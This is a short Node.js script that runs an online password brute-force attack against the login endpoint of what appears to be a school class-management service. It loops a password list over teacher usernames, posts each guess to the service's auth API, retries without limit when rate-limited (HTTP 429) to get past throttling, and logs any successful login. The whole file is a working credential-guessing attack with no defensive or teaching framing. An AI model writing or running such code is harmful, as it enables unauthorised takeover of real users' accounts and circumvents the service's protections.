import fs from "fs";
import axiosRetry from "axios-retry";
import axios from "axios";

const passwords = fs
  .readFileSync("./passwords.txt", "utf-8")
  .trim()
  .split("\n");

const teachers = fs.readFileSync("./teachers.txt", "utf-8").trim().split("\n");

let current = Number(fs.readFileSync("./current.txt", "utf-8"));

axiosRetry(axios, {
  retryCondition: (result) => result.response.status === 429,
  retries: Infinity,
  retryDelay: axiosRetry.exponentialDelay,
});

const teacher = teachers[current];

for (const [index, password] of passwords.entries()) {
  try {
    const { data, status, statusText } = await axios.post(
      "https://ltv-api.quanlylop.com/auth/local",
      {
        identifier: teacher,
        password,
      }
    );

    console.log(
      `${teacher} - (${index + 1}) ${password}: OK ${status} ${statusText} ${
        data?.message?.[0]?.messages?.[0]?.message
      }`
    );

    process.exit(1);
  } catch (error) {
    console.log(
      `${teacher} - (${index + 1}) ${password}: Failed ${
        error.response.status
      } ${error.response.statusText} ${
        error.response.data?.message?.[0]?.messages?.[0]?.message
      }`
    );
  }
}

fs.writeFileSync("./current.txt", String(current + 1));
